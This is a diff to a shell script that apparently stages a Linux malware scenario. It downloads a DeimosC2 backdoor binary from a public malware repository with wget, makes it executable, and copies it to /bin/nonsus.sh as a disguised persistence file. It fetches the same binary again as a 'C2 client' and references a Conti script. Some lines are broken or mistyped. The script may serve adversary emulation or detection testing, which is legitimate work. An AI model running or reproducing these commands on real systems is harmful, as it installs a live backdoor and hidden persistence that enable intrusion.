@@ -26,7 +26,7 @@ echo "[+] Downloading Unixbackdoor Script "
 wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O unixbackdoor.sh
 chmod 700 unixbackdoor.sh
 sh unix
-sleep 
+sleep 3
 
 # Senario 1.A Local Malware Persisitance 
 # Create Shadow Copies 
@@ -39,7 +39,6 @@ echo "[+] Creating more shadow copies"
 cat unixbackdoor.sh > /bin/nonsus.sh
 chmod 700 /bin/nonsus.sh 
 sleep 10 
-sh nonsus.sh
 
 # make executaable
 echo "[+] Making unixbackdoor executable"
@@ -58,7 +57,7 @@ chmod 700 conti.sh
 sleep 3
 
 # Step 3 - c2 
-echo "[+]" 
+echo "[+] downloading C2 client " 
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 c2.sh
 sleep 5
 
